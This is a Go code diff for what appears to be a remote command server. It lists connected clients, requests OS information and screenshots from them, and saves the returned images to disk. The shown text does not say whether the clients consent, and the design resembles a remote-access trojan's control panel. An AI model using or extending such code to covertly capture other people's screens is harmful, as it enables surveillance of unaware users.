@@ -137,7 +137,7 @@ func (s server) HandleCommands(srv pb.Com_HandleCommandsServer) error {
 
 				for shot := range shots {
 
-					ioutil.WriteFile(string(time.Now().Unix())+".png", shots[shot].Data, 0777)
+					ioutil.WriteFile(time.Now().Format("20060102150405")+".png", shots[shot].Data, 0777)
 				}
 
 			}
@@ -179,7 +179,8 @@ func main() {
 func (cli *CommandLine) printUsage() {
 	fmt.Println("Usage: ")
 	fmt.Println("clients - [Gets connected clients]")
-	fmt.Println("osinfo <clientid> - [Gets OSINFO of specified client]")
+	fmt.Println("osinfo -clientid <id> - [Gets OSINFO of specified client]")
+	fmt.Println("screenshot -clientid <id> - [Gets SCREENSHOTS of specified client]")
 }
 
 func (cli *CommandLine) validateArgs(data []string) {
@@ -273,41 +274,42 @@ func (cli *CommandLine) Run() {
 				}
 
 			}
-			if screenshot.Parsed() {
-				if *clientscreenshot == "" {
-					screenshot.Usage()
+
+		}
+
+		if screenshot.Parsed() {
+			if *clientscreenshot == "" {
+				screenshot.Usage()
+			} else {
+
+				if id, err := strconv.Atoi(*clientscreenshot); err == nil {
+					localIds := GenerateClientsIds(Clients)
+					if Clients[localIds[id]].ID != "" {
+						if Command[Clients[localIds[id]].ID] == "screenshot" {
+							log.Println("WARING: screenshot request already sent to client... Please wait a response!")
+						} else {
+							log.Println("INFO: screenshot request sent to client... Please wait a response!")
+							Command[Clients[localIds[id]].ID] = "screenshot"
+						}
+					} else {
+						log.Println("ERROR: Invalid Client ID!")
+					}
+
 				} else {
 
-					if id, err := strconv.Atoi(*clientscreenshot); err == nil {
-						localIds := GenerateClientsIds(Clients)
-						if Clients[localIds[id]].ID != "" {
-							if Command[Clients[localIds[id]].ID] == "screenshot" {
-								log.Println("WARING: screenshot request already sent to client... Please wait a response!")
-							} else {
-								log.Println("INFO: screenshot request sent to client... Please wait a response!")
-								Command[Clients[localIds[id]].ID] = "screenshot"
-							}
+					if Clients[*clientscreenshot].ID != "" {
+						if Command[*clientscreenshot] == "screenshot" {
+							log.Println("WARING: screenshot request already sent to client... Please wait a response!")
 						} else {
-							log.Println("ERROR: Invalid Client ID!")
+							log.Println("INFO: screenshot request sent to client... Please wait a response!")
+							Command[*clientscreenshot] = "screenshot"
 						}
-
 					} else {
-
-						if Clients[*clientscreenshot].ID != "" {
-							if Command[*clientscreenshot] == "screenshot" {
-								log.Println("WARING: screenshot request already sent to client... Please wait a response!")
-							} else {
-								log.Println("INFO: screenshot request sent to client... Please wait a response!")
-								Command[*clientscreenshot] = "screenshot"
-							}
-						} else {
-							log.Println("ERROR: Invalid Client ID!")
-						}
-
+						log.Println("ERROR: Invalid Client ID!")
 					}
+
 				}
 			}
-
 		}
 	}
 
